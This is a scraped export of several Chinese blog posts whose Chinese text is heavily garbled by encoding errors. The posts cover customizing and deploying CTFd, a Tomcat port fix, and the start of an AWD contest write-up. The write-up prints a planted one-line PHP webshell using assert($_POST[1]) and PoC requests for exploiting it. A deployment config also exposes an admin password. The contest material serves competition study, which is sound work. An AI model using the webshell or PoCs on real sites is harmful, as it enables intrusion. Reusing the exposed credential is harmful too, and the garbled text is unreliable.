é¦–å…ˆå‚ç…§CTFdå®˜æ–¹ä»“åº“æ–‡æ¡£è¿›è¡Œå®‰è£…ï¼Œè¿™å‡ æ­¥ä¹Ÿæ¯”è¾ƒç®€å•ã€‚\næ¥ç€æˆ‘ä»¬å¯ä»¥ç›´æ¥ç°åœ¨CTFd/themes/core/templates/register.htmlä¸­åŠ å…¥å¯¹åº”çš„ç‰‡æ®µï¼Œå¯¹åº”çš„optionå¯¹åº”çš„valueå¯ä»¥æ˜¯ä¸­æ–‡ã€‚\n\u0026lt;select class=\u0026#34;form-control input-filled-valid\u0026#34; name=\u0026#34;school\u0026#34; id=\u0026#34;school-input\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;xxå¤§å­¦\u0026#34;\u0026gt;xxå¤§å­¦\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; å…¶æ¬¡æˆ‘ä»¬éœ€è¦åœ¨models.pyä¸­æ‰¾åˆ°å¯¹åº”çš„Class Teamsï¼Œè¿™é‡Œåˆå§‹åŒ–äº†é˜Ÿä¼çš„ä¸€äº›ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå†åŠ ä¸Šä¸€ä¸ªschoolæˆå‘˜å°±å¥½\nschool = db.Column(db.String(128)) ä¹‹ååˆå§‹åŒ–çš„æ—¶å€™ï¼Œæˆ‘ä¸€ç›´å¯¹äºCçš„å¤šé‡æ„é€ ä¸€ç›´è€¿è€¿äºæ€€ï¼Œæƒ³ç€è¿™é‡Œåˆå§‹åŒ–Teamsçš„æ—¶å€™ä¹Ÿæ ¹æ®å‚æ•°çš„ä¸ªæ•°ä¸åŒä½¿ç”¨ä¸åŒçš„æ„é€ æ–¹æ³•ï¼Œè¿™æ ·å¯ä»¥ä¸ç”¨ä¿®æ”¹åŸæ¥æ˜¯ç”¨çš„æ„é€ æ–¹æ³•ï¼ŒæŸ¥é˜…èµ„æ–™å‘ç°å¯ä»¥è¿™ä¹ˆå†™ã€‚\nimport time class Date: \u0026#34;\u0026#34;\u0026#34;æ–¹æ³•ä¸€ï¼šä½¿ç”¨ç±»æ–¹æ³•\u0026#34;\u0026#34;\u0026#34; # Primary constructor def __init__(self, year, month, day): self.year = year self.month = month self.day = day # Alternate constructor @classmethod def today(cls): t = time.localtime() return cls(t.tm_year, t.tm_mon, t.tm_mday) è™½ç„¶å¯ä»¥è¿™ä¹ˆå†™ï¼Œä½†æ˜¯æˆ‘åœ¨å¼„æ’è¡Œæ¦œçš„æ—¶å€™ï¼Œç¬¬ä¸€æ¬¡è®¿é—®æœ‰æ–°é˜Ÿä¼çš„æ’è¡Œæ¦œæ€»ä¼šæŠ¥é”™ã€‚\n'unicode' object has no attribute 'label' æ³¨å†Œé˜Ÿä¼è€æ˜¯ä¸èƒ½æŠŠå­¦æ ¡å†™è¿›sqliteï¼Œè¿™å°±å¾ˆçƒ¦äº†ã€‚è€Œä¸”ç¬¬ä¸€æ¬¡æ³¨å†Œçš„æ—¶å€™è€æ˜¯æŠ¥é”™ï¼Œç»“æœæœ€åè¯¢é—®äº†ä¸œå¤§çš„å¸ˆå‚…ï¼Œä»–ä»¬çš„å†™æ³•æ˜¯åœ¨models.pyç»™class TeamsåŠ å…¥schoolæˆå‘˜åï¼Œåœ¨auth.pyä¸‹çš„registeræ–¹æ³•ä¸­ï¼Œè¿™ä¹ˆå†™\nschool = request.form[\u0026#39;school\u0026#39;] #è·å–schoolå‚æ•° ... if len(errors) \u0026gt; 0: return render_template(\u0026#39;register.html\u0026#39;,errors=errors,name=request.form[\u0026#39;name\u0026#39;],email=request.form[\u0026#39;email\u0026#39;],password=request.form[\u0026#39;password\u0026#39;]) else: with app.app_context(): team = Teams(name, email.lower(), password) team.school = shcool #ç›´æ¥è®©schoolå‚æ•°èµ‹å€¼ç»™schoolæˆå‘˜å˜é‡ db.session.add(team) db.session.commit() db.session.flush() ä½¿ç”¨åŸæ¥çš„æ„é€ æ–¹æ³•ï¼Œè¿™ä¸ªé—®é¢˜å°±è§£å†³äº†\u0026hellip;2333 è§£å†³äº†æ³¨å†Œçš„é—®é¢˜ï¼Œæ’è¡Œæ¦œçš„æ˜¾ç¤ºä¹Ÿå°±æ¯”è¾ƒç®€å•äº†ï¼Œé¦–å…ˆæ”¹CTFd/themes/core/templates/scoreboard.htmlä¸­çš„æ¨¡ç‰ˆä»£ç \n\u0026lt;div id=\u0026#34;scoreboard\u0026#34; class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-12\u0026#34;\u0026gt; \u0026lt;table class=\u0026#34;table table-striped\u0026#34;\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td scope=\u0026#34;col\u0026#34; width=\u0026#34;10px\u0026#34;\u0026gt;\u0026lt;b\u0026gt;Place\u0026lt;/b\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td scope=\u0026#34;col\u0026#34;\u0026gt;\u0026lt;b\u0026gt;Team\u0026lt;/b\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td scope=\u0026#34;col\u0026#34;\u0026gt;\u0026lt;b\u0026gt;School\u0026lt;/b\u0026gt;\u0026lt;/td\u0026gt; //åŠ å…¥Schoolè¡¨å¤´ \u0026lt;td scope=\u0026#34;col\u0026#34;\u0026gt;\u0026lt;b\u0026gt;Score\u0026lt;/b\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt; {% for team in teams %} \u0026lt;tr\u0026gt; \u0026lt;th scope=\u0026#34;row\u0026#34; class=\u0026#34;text-center\u0026#34;\u0026gt;{{ loop.index }}\u0026lt;/th\u0026gt; \u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;{{ request.script_root }}/team/{{ team.teamid }}\u0026#34;\u0026gt;{{ team.name | truncate(50) }}\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;{{ team.school }}\u0026lt;/td\u0026gt; //åŠ å…¥team.schoolå†…å®¹ \u0026lt;td\u0026gt;{{ team.score }}\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; {% endfor %} \u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; æ¥ä¸‹æ¥æŠŠå°±å»scoreboard.pyè·å–team.school,é€šè¿‡å¤§æ¦‚çš„çŒœæµ‹ä»¥åŠæ¨æ–­ï¼Œæˆ‘ä»¬å¯ä»¥å¸¦æ”¹çŸ¥é“ä»è¿™é‡Œä¿®æ”¹:\nif admin: standings_query = db.session.query( Teams.id.label(\u0026#39;teamid\u0026#39;), Teams.name.label(\u0026#39;name\u0026#39;), Teams.school.label(\u0026#39;school\u0026#39;), Teams.banned, sumscores.columns.score )\\ .join(sumscores, Teams.id == sumscores.columns.teamid) \\ .order_by(sumscores.columns.score.desc(), sumscores.columns.id) else: standings_query = db.session.query( Teams.id.label(\u0026#39;teamid\u0026#39;), Teams.name.label(\u0026#39;name\u0026#39;), Teams.school.label(\u0026#39;school\u0026#39;), sumscores.columns.score )\\ .join(sumscores, Teams.id == sumscores.columns.teamid) \\ .filter(Teams.banned == False) \\ .order_by(sumscores.columns.score.desc(), sumscores.columns.id) è¿™æ ·scoreboardåŸºæœ¬å°±æ”¹å®Œäº†ã€‚æ¥ç€æˆ‘ä»¬å†å»ç®¡ç†å‘˜çš„Teamsç•Œé¢åŠ å…¥å­¦æ ¡åæ–¹ä¾¿æŸ¥é˜Ÿä¼çš„æ—¶å€™çŸ¥é“æ˜¯å“ªä¸ªå­¦æ ¡çš„ã€‚åŒæ ·ï¼Œå…ˆæ”¹CTFd/themes/admin/templates/teams.html\n\u0026lt;td class=\u0026#34;team-id\u0026#34; value=\u0026#34;{{ team.id }}\u0026#34;\u0026gt;{{ team.id }}\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;team-name\u0026#34; value=\u0026#34;{{ team.name }}\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ request.script_root }}/admin/team/{{ team.id }}\u0026#34;\u0026gt;{{ team.name | truncate(32) }}\u0026lt;/a\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;team-email d-none d-md-table-cell d-lg-table-cell\u0026#34; value=\u0026#34;{{ team.email }}\u0026#34;\u0026gt;{{ team.email | truncate(32) }}\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;team-id d-md-table-cell d-lg-table-cell\u0026#34; value=\u0026#34;{{ team.school }}\u0026#34;\u0026gt;{{ team.school }}\u0026lt;/td\u0026gt; è¿™æ ·åŸºæœ¬å°±å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¿®æ”¹é¦–é¡µï¼Œç›´æ¥é…ç½®å¥½ä¹‹åå»Adminé¢æ¿é€šè¿‡ç¼–è¾‘Pagesæ¥æ“ä½œä¼šæ›´åŠ æ–¹ä¾¿ã€‚ï¼ˆä¸€å¼€å§‹æˆ‘ç›´æ¥åœ¨views.pyä¸­ä¿®æ”¹indexï¼Œè¿™ä¸ªæ˜¯è¦è¢«å†™è¿›æ•°æ®åº“çš„pagesä¸­çš„ï¼Œæˆ‘ä¸€è¾¹æ”¹ä¸€è¾¹updateæ•°æ®åº“ï¼Œç°åœ¨æƒ³èµ·æ¥ç®€ç›´è ¢çˆ†ã€‚\nåˆ°è¿™é‡Œæˆ‘ä»¬è‡ªå®šä¹‰CTFdåŸºæœ¬å°±å®Œæˆäº†ã€‚ï¼ˆæœ‰äº›åŠŸèƒ½ä»ç„¶è¿˜ä¼šæŠ¥é”™ï¼Œä¾‹å¦‚å¯¼å‡ºæ¯”èµ›åŠŸèƒ½ï¼Œå› ä¸ºTeamså¤šäº†ä¸€ä¸ªå­—æ®µschoolï¼Œæ‰€ä»¥å¾ˆå¤§ä¸€éƒ¨åˆ†å…¶ä»–æŠ¥é”™ï¼Œè™½ç„¶ç›®å‰æˆ‘åªé‡åˆ°è¿™ä¸ªåŠŸèƒ½ä¼šæŠ¥é”™ï¼ŒåŸºæœ¬éƒ½æ˜¯å› ä¸ºè‡ªå®šä¹‰å¢åŠ äº†è¿™ä¸ªå­—æ®µå¯¼è‡´çš„ï¼Œå»çœ‹çœ‹æºç æŠŠç›¸åº”ç¼ºå°‘çš„åŠ ä¸ŠåŸºæœ¬å°±èƒ½è§£å†³äº†ã€‚\nEnviroment æœ¬æ¬¡é‡‡ç”¨çš„é…ç½®æ˜¯ä½¿ç”¨nginxã€mysqlã€uwsgiæ¥é…ç½®ctfdï¼Œé…ç½®ç¯å¢ƒåœ¨ubuntu serve 18.04ä¸‹ï¼Œå®‰è£…è¿‡ç¨‹å°±ä¸æäº†ã€‚ç½‘ä¸Šæ•™ç¨‹å¾ˆå¤šã€‚\nè¿™é‡Œè¯´ä¸€ä¸‹nginxçš„é…ç½®ï¼š\nserverÂ { listen 80; server_name Your domain; location / { include uwsgi_params; uwsgi_pass unix:/tmp/uwsgi.sock; } } ç„¶åéœ€è¦æŠŠCTFdè¿æ¥æ•°æ®åº“çš„æ–¹æ³•æ”¹æˆmysqlï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°CTFd/config.pyä¸­\nDATABASE_URL = os.environ.get( \u0026#39;DATABASE_URL\u0026#39;) or \u0026#39;sqlite:///{}/ctfd.db\u0026#39;.format(os.path.dirname(os.path.abspath(__file__))) æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç¯å¢ƒä¸­å®šä¹‰DATABASE_URLï¼Œå‚è€ƒå®ƒç»™å‡ºçš„æ ¼å¼\ne.g. mysql+pymysql://root:\u0026lt;YOUR_PASSWORD_HERE\u0026gt;@localhost/ctfd ä½†æ˜¯æˆ‘ä»¬æœ€å¥½ä¸è¦ç”¨rootä½¿ç”¨mysqlï¼Œè€Œä¸”å¦‚æœæˆ‘å½“æ—¶ç”¨rootç”¨æˆ·çš„è¯ï¼Œç›´æ¥æŠ¥é”™äº†\nERROR 1698 (28000): Access denied for user 'root'@'localhost' å‚è€ƒMySQL ERROR 1698 (28000) é”™è¯¯ï¼Œæ˜¯å› ä¸ºæˆ‘çš„rootç”¨æˆ·çš„pluginæ²¡æœ‰é…ç½®å¥½ï¼Œè€Œä¸”ç”¨rootç”¨æˆ·è¿æ¥mysqlä¸å¤ªå®‰å…¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªctfdçš„æ•°æ®åº“ç”¨æˆ·ï¼Œå¹¶ç»™äºˆå®ƒctfdæ•°æ®åº“çš„æ‰€æœ‰æƒåŠ›ã€‚\nCREATEUSER\u0026#39;ctfd\u0026#39;@\u0026#39;localhost\u0026#39;IDENTIFIEDBY\u0026#39;Your password\u0026#39;;//åˆ›å»ºç”¨æˆ·selectuser,pluginfrommysql.user;//æŸ¥çœ‹å½“å‰æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·çš„pluginupdatemysql.usersetplugin=\u0026#39;mysql_native_password\u0026#39;whereuser=\u0026#39;ctfd\u0026#39;;//æ›´æ”¹ctfdç”¨æˆ·çš„pluginï¼Œå¯ä»¥ä½¿ç”¨å¯†ç ç™»å½•ctfdç”¨æˆ·GRANTALLONctfd.*TO\u0026#39;ctfd\u0026#39;@\u0026#39;localhost\u0026#39;;//ç»™äºˆctfdç”¨æˆ·ctfdæ•°æ®åº“çš„æƒåŠ›è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨bashä¸­\nexport DATABASE_URL=mysql+pymysql://ctfd:Your password@localhost/ctfd ä½†æ˜¯è¿™æ ·ä¸å¤ªä¼˜é›…ï¼Œæˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªuwsgi.iniä¸­å†™å…¥\n[uwsgi] # Where you've put CTFD chdir = /your/dir/CTFd env = \u0026quot;DATABASE_URL=mysql+pymysql://ctfd:Your password@localhost/ctfd\u0026quot; è¿™æ ·ä¼šæ¯”è¾ƒå¥½ã€‚è¿™æ ·ï¼Œè¿æ¥æ•°æ®åº“çš„æ“ä½œå°±åŸºæœ¬å®Œæˆäº†ã€‚\nç„¶åä¸ºäº†æ–¹ä¾¿è¿ç»´ï¼Œå¯ä»¥ä½¿ç”¨Supervisorå¯¹uwsgiè¿›è¡Œç®¡ç†æ“ä½œã€‚è´´ä¸€ä¸‹å½“æ—¶çš„é…ç½®æ–‡ä»¶\n[unix_http_server] file = /var/run/supervisor.sock ;chmod=0700 ; socket file mode (default 0700) ;chown=nobody:nogroup ; socket file uid:gid owner ;username=user ; (default is no username (open server)) ;password=123 ; (default is no password (open server)) [inet_http_server] ; inet (TCP) server disabled by default port=9001 ; (ip_address:port specifier, *:port for ;all iface) username=admin ; (default is no username (open server)) password=suctf_new_2018 ; (default is no password (open server)) [supervisord] ;logfile=/tmp/supervisord.log ; (main log file;default $CWD/supervisord.log) ;ä¿®æ”¹ä¸º /var/log ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤ logfile=/var/log/supervisord/supervisord.log ; (main log file;default $CWD/supervisord.log) ; æ—¥å¿—æ–‡ä»¶å¤šå¤§æ—¶è¿›è¡Œåˆ†å‰² logfile_maxbytes=50MB ; (max main logfile bytes b4 rotation;default 50MB) ; æœ€å¤šä¿ç•™å¤šå°‘ä»½æ—¥å¿—æ–‡ä»¶ logfile_backups=10 ; (num of main logfile rotation backups;default 10) loglevel=info ; (log level;default info; others: debug,warn,trace) pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid) ;è®¾ç½®å¯åŠ¨supervisordçš„ç”¨æˆ·ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸è¦è½»æ˜“ç”¨rootç”¨æˆ·æ¥å¯åŠ¨ï¼Œé™¤éä½ çœŸçš„ç¡®å®šè¦è¿™ä¹ˆåš ;user=chrism ; (default is current user, required if root) minfds=1024 ; (min. avail startup file descriptors;default 1024) minprocs=200 ; (min. avail process descriptors;default 200) childlogdir=/var/log/supervisord/ ; ('AUTO' child log dir, default $TEMP) [supervisorctl] ; å¿…é¡»å’Œ'unix_http_server'é‡Œé¢çš„è®¾å®šåŒ¹é… ;serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL for a unix socket ;ä¿®æ”¹ä¸º /home/supervisor ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤ serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket username=admin ; should be same as http_username if set password=suctf_new_2018 ; should be same as http_password if set [program:uwsgi] command=uwsgi -s /tmp/uwsgi.sock --chmod-socket=666 -w 'CTFd:create_app()' directory=/xxx/CTFd autostart = true startsecs = 5 redirect_stderr = true ;è¿™å¯¹è¿™ä¸ªprogramçš„logçš„é…ç½®ï¼Œä¸Šé¢çš„logfile_maxbytesæ˜¯supervisordæœ¬èº«çš„logé…ç½® stdout_logfile_maxbytes = 20MB stdoiut_logfile_backups = 20 stdout_logfile = /var/log/supervisord/uwsgi.log å…·ä½“å¯ä»¥å‚è€ƒï¼š Python è¿›ç¨‹ç®¡ç†å·¥å…· Supervisor ä½¿ç”¨æ•™ç¨‹ ç”¨Supervisordç®¡ç†Pythonè¿›ç¨‹ Python è¿›ç¨‹ç®¡ç†å·¥å…· Supervisor ä½¿ç”¨æ•™ç¨‹ ã€å·²è§£å†³ã€‘supervisorå»å¯åŠ¨gunicornçš„Flaskå‡ºé”™ï¼šsupervisor couldnâ€™t setuid to 0 Canâ€™t drop privilege as nonroot user\næœ€åç™½å¸ˆå‚…é€šè¿‡åšæˆäº†ç³»ç»ŸæœåŠ¡æ¥ç®¡ç†çš„uwsgiï¼Œè¿™é‡Œç•™åˆ°NUAACTFå†æ¥æ›´å§ã€‚\nPS:ä»Šå¤©ä¸­åˆ12ï¼š28åˆšåˆšå‘ç°CTFdæ›´æ–°åˆ°äº†2.0ï¼Œå¯èƒ½ç¨æœ‰ä¸åŒã€‚åç»­åšå®ŒNUAACTFæˆ‘ä¼šå†æ›´ä¸€ä¸‹ã€‚\n","date":"2018-11-20T16:24:55Z","permalink":"https://blog.zeddyu.info/2018/11/20/SUCTF%E5%B0%8F%E8%AE%B0/","title":"SUCTFäº”æ ¡è”åˆæ‹›æ–°èµ›å°è®°"},{"content":"å¾ˆä¹…ä¸ç”¨ideaäº†ï¼Œçªç„¶ç”¨ideaå¯åŠ¨ä¸€ä¸ªtomcatçš„java webé¡¹ç›®ï¼Œç»“æœä¸€ç›´æç¤º\nAddress localhost:1099 already in use è‡ªå·±é€šè¿‡\nlsof -i :1099 å¹¶æ²¡æœ‰å‘ç°ç«¯å£å ç”¨ï¼Œé‡è£…äº†ideaã€tomcatéƒ½ä¸è¡Œï¼Œæ¢äº†ä¸€ä¸ªå·²ç»ç¡®è®¤æ˜¯æ²¡æœ‰å ç”¨çš„ç«¯å£ä¹Ÿè¿˜æ˜¯ä¸è¡Œã€‚\nç»è¿‡å„ç§æœç´¢é€”å¾„æ‰¾åˆ°çš„éƒ½æ˜¯æ£€æŸ¥ç«¯å£å ç”¨ï¼Œå†æŠŠå ç”¨ç«¯å£çš„è¿›ç¨‹å…³æ‰å³å¯ï¼›æˆ–è€…åˆæ˜¯æ¢å¦ä¸€ä¸ªç«¯å£ã€‚\nå¯¹äºæˆ‘è¿™ç§æƒ…å†µéƒ½æ˜¯æ— æµäºäº‹ã€‚æœ€åè§£å†³æ–¹æ¡ˆå‚è€ƒäº†è®°ä¸€æ¬¡Mac IntelliJä¸­Tomcatå´©æºƒçš„æ€ªå¼‚ç°è±¡ï¼ˆåˆ†æä¸è§£è¯»ï¼‰\nè¿™é‡Œç›´æ¥æè§£å†³æ–¹æ³•ï¼Œå°±æ˜¯åœ¨/etc/hostsä¸‹ç¼–è¾‘å¢åŠ \n127.0.0.1\tlocalhost è¿™ä¸ªé—®é¢˜å°±å¯ä»¥å¾—åˆ°è§£å†³\nå¦‚æœè¿˜æœ‰æç¤ºcannot run program '/path/to/tomcat/bin/catalina.sh' error=13 permission deniedçš„é”™è¯¯ï¼Œæ£€æŸ¥ç›¸å…³æ–‡ä»¶çš„æƒé™ï¼Œè¿™é‡Œæˆ‘æ˜¯å› ä¸ºé‡æ–°ä¸‹è½½äº†tomcatå¯¼è‡´catalina.shæ²¡æœ‰è¿è¡Œçš„æƒé™ï¼ŒåŠ ä¸Šä»¥åå³å¯æˆåŠŸè¿è¡Œã€‚\n","date":"2018-08-26T20:02:10Z","permalink":"https://blog.zeddyu.info/2018/08/26/Mac-idea-%E5%90%AF%E5%8A%A8tomcat%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E5%A5%87%E5%BC%82%E9%97%AE%E9%A2%98/","title":"Mac idea å¯åŠ¨tomcatç«¯å£å ç”¨å¥‡å¼‚é—®é¢˜"},{"content":"å¥½ä¹…æ²¡å‘åšå®¢äº†\u0026hellip;ä¸»è¦æ˜¯æ¯”èµ›å¤ªå¤šäº†\u0026hellip;è¿™å‡ ä¸ªæœˆå‘¨æœ«å‡ ä¹æ— ä¼‘ï¼ŒåŸºæœ¬éƒ½æ˜¯å„ç§æ¯”èµ›\nå…ˆæ…¢æ…¢æ¥æ€»ç»“å§ã€‚\nâ€œè¥¿æ¹–è®ºå‰‘â€æ¯çº¿ä¸‹AWD å‰ä¸€ä¸ªå°æ—¶å’Œå¹³å‘è‚²ï¼ŒåŸºæœ¬æ²¡äººæ‰“\u0026hellip;ä¹Ÿä¸çŸ¥é“ä¸ºå•¥\u0026hellip;\nè¿™æ¬¡ä¹Ÿæ˜¯æˆ‘ç¬¬äºŒæ¬¡å‚åŠ AWDï¼Œç¬¬ä¸€æ¬¡æ˜¯åœ¨å¤§ä¸€æš‘å‡å‚åŠ çš„XManç»“è¥èµ›çš„æ”»é˜²\u0026hellip;é‚£æ—¶å€™å•¥éƒ½ä¸æ‡‚ï¼ŒåŸºæœ¬å°±æ˜¯é é˜Ÿå†…å¤§ä½¬å¸¦é£ï¼Œç›´æ¥é£åˆ°äº†å›¢é˜Ÿç¬¬å…­ï¼Œä¹Ÿå°±å¸®å¸®å¤§ä½¬ä¼ ä¼ shellå•¥çš„ï¼Œä¸è¿‡ä¹Ÿå¯¹æ”»é˜²èµ›æœ‰äº†ä¸€ä¸ªå¤§è‡´çš„å°è±¡ã€‚\nè¿™æ¬¡AWDå‚é€‰å®¡æ ¸è¿˜æ˜¯æ¯”è¾ƒæ°´çš„\u0026hellip;å½“æ—¶å¥½å¤šéƒ½ä¸çŸ¥é“æ€ä¹ˆæ‰“çš„éƒ½æ¥å‚åŠ äº†\u0026hellip;æˆ‘è¿˜ä»¥ä¸ºæ˜¯å¤§ä½¬äº‘é›†ï¼Œæˆ‘ä¼šè¢«æ‰“çš„ç”µè„‘éƒ½å¼€ä¸äº†çš„é‚£ç§2333\u0026hellip;æ„Ÿè§‰å¤§å®¶éƒ½è¿˜å·®ä¸å¤š\u0026hellip;èº«åé‚£æ”¯é˜Ÿåæ¥ç›´æ¥æ”¾å¼ƒäº†ï¼ŒèŠèµ·å¤©æ¥äº†\u0026hellip;\nèµ›åæƒ³æƒ³ï¼Œä¸€å¼€å§‹æ²¡äººæ‰“çœŸçš„æŒºå¥‡æ€ªçš„ï¼Œå› ä¸ºç»™çš„æ´éå¸¸æ˜æ˜¾\nè¿™é‡Œæ”¾ä¸€ä¸ªä¸€å¶é£˜é›¶å¤§ä½¬çš„èµ›æ—¶åˆ†ææ–‡ç« å§ï¼Œæˆ‘è§‰å¾—å†™å¾—éå¸¸å¥½çš„ï¼Œè¿˜æ˜¯å¤šåº”è¯¥å‘å¤§ä½¬å­¦ä¹ å­¦ä¹ \nPoc 1 é¦–å…ˆåœ¨mobile\\themes\\default\\auction_list.dwtä¸­æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„ä¸€å¥è¯é©¬\n{:assert($_POST[1])}\nè¿™é‡Œè¦æ˜¯è°å‘ç°çš„æ—©ï¼Œåº”è¯¥å¾ˆå¿«å°±å¯ä»¥æ‰“äº†\u0026hellip;åªæ˜¯æ²¡äººæ‰“\u0026hellip;ä½†æ˜¯è¿™ä¹Ÿæ˜¯èµ›ä¸­å®˜æ–¹ç»™äº†hintæˆ‘ä»¬æ‰å‘ç°çš„\u0026hellip;\nèµ›åç”¨Dç›¾æ‰«äº†ä¸€éå•¥æ´éƒ½æ²¡å‘ç°\u0026hellip;\nåæ¥çš„pocéƒ½æ˜¯æŠ„ä½œä¸šæŠ„è¿‡æ¥çš„\u0026hellip;å½“æ—¶ä¹Ÿæ˜¯è¢«æ‰“å¾—æŒºæƒ¨çš„\u0026hellip;è¿˜æ˜¯æŠ“logåæ¥æ‰çŸ¥é“æ€ä¹ˆæ‰“\u0026hellip;è¿˜æ˜¯ç»éªŒå¤ªå°‘äº†\nåŸºæœ¬æŠ„çš„è¿˜æ˜¯è¿™ä¸ªç‚¹\npostæ–¹å¼ æ–‡ä»¶urlï¼šhttp://10.50.33.2/mobile/index.php?m=default\u0026amp;c=auction å‚æ•°ï¼š1=phpinfo() Poc 1 åˆ†æ é¦–å…ˆï¼Œå…ˆçœ‹assert()ï¼Œå‚ç…§phpæ–‡æ¡£ã€‚\n PHP 5\nbool assert ( mixed $assertion [, string $description ] )\n PHP 7\nbool assert ( mixed $assertion [, Throwable $exception ] )\nå¦‚æœÂ assertionÂ æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢«Â assert()Â å½“åš PHP ä»£ç æ¥æ‰§è¡Œ\n å¾ˆç»å…¸çš„ä¸€ä¸ªä¸€å¥è¯é©¬\nå†çœ‹ä¸ºä»€ä¹ˆåœ¨dwtæ–‡ä»¶é‡Œé¢å°±å¯ä»¥\n dwt æ–‡ä»¶æ˜¯ç½‘é¡µæ¨¡æ¿æ–‡ä»¶(Dreamweaver Template), åœ¨åˆ›å»ºç½‘ç«™çš„å¤šä¸ªç½‘é¡µçš„æ—¶å€™ï¼Œé€šå¸¸å¯ä»¥å°†ç½‘é¡µçš„å…±åŒéƒ¨åˆ†åˆ›å»ºæˆä¸ºä¸€ä¸ªæ¨¡æ¿ï¼Œ ç„¶åç»™å¤šä¸ªç½‘é¡µè°ƒç”¨ï¼Œ ä»¥å®ç°ç½‘é¡µä»£ç çš„é‡å¤åˆ©ç”¨Â· åˆ¶ä½œæ¨¡æ¿çš„æ—¶å€™ï¼Œ ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰çš„æ¨¡æ¿å¯ç¼–è¾‘åŒºåŸŸå’Œéå¯ç¼–è¾‘åŒºåŸŸï¼Œ å¯ç¼–è¾‘åŒºåŸŸå°†åœ¨è°ƒç”¨æ¨¡æ¿çš„ç½‘é¡µä¸­å†æ¬¡å¡«å……ä»£ç \n æ—¢ç„¶æ˜¯ä¸ªç½‘é¡µæ¨¡ç‰ˆï¼Œè€Œæ•´ä¸ªç«™éƒ½ç”¨çš„æ˜¯phpï¼Œæ¨¡ç‰ˆé‡Œçš„å­—ç¬¦ä¸²è‡ªç„¶ä¼šè¢«å½“ä½œphpæ¥è§£æã€‚æ‰€ä»¥è¿™é‡Œä¸€å¥è¯é©¬å¯ä»¥è¢«æ‰§è¡Œ\nPoc 2 å‚ç…§ä¸€å¶é£˜é›¶å¤§ä½¬çš„\npostæ–¹å¼ æ–‡ä»¶urlï¼šhttp://10.50.%s.2/mobile/index.php å‚æ•°ï¼šurl=http://10.0.1.2?token=é˜Ÿä¼token Poc 2 åˆ†æ æˆ‘ä»¬ä»mobile/index.phpå¼€å§‹åˆ†æï¼š\n\u0026lt;?php /* è®¿é—®æ§åˆ¶ */ define(\u0026#39;IN_ECTOUCH\u0026#39;, true); /* è®¾ç½®ç³»ç»Ÿç¼–ç æ ¼å¼ */ header(\u0026#34;Content-Type:text/html;charset=utf-8\u0026#34;); /* è®¾ç½®ç³»ç»Ÿç¼–ç æ ¼å¼ */ header(\u0026#34;Pragma: no-cache\u0026#34;); /* ä¿®å¤åé€€æ²¡æœ‰æäº¤æ•°æ®çš„é—®é¢˜ */ header(\u0026#34;Cache-control: private\u0026#34;); /* åŠ è½½æ ¸å¿ƒæ–‡ä»¶ */ require (\u0026#39;include/EcTouch.php\u0026#39;); è·Ÿè¸ªrequire(...)å‡½æ•°ï¼Œçœ‹åˆ°EcTouch.php\n\u0026lt;?php /* è®¿é—®æ§åˆ¶ */ defined(\u0026#39;IN_ECTOUCH\u0026#39;) or die(\u0026#39;Deny Access\u0026#39;); if (version_compare(PHP_VERSION, \u0026#39;5.2.0\u0026#39;, \u0026#39;\u0026lt;\u0026#39;)) die(\u0026#39;require PHP \u0026gt; 5.2.0 !\u0026#39;); defined(\u0026#39;BASE_PATH\u0026#39;) or define(\u0026#39;BASE_PATH\u0026#39;, dirname(__FILE__) . \u0026#39;/\u0026#39;); defined(\u0026#39;ROOT_PATH\u0026#39;) or define(\u0026#39;ROOT_PATH\u0026#39;, realpath(dirname(__FILE__) . \u0026#39;/../\u0026#39;) . \u0026#39;/\u0026#39;); defined(\u0026#39;APP_PATH\u0026#39;) or define(\u0026#39;APP_PATH\u0026#39;, BASE_PATH . \u0026#39;apps/\u0026#39;); defined(\u0026#39;ADDONS_PATH\u0026#39;) or define(\u0026#39;ADDONS_PATH\u0026#39;, ROOT_PATH . \u0026#39;plugins/\u0026#39;); defined(\u0026#39;DEFAULT_APP\u0026#39;) or define(\u0026#39;DEFAULT_APP\u0026#39;, \u0026#39;default\u0026#39;); defined(\u0026#39;DEFAULT_CONTROLLER\u0026#39;) or define(\u0026#39;DEFAULT_CONTROLLER\u0026#39;, \u0026#39;Index\u0026#39;); 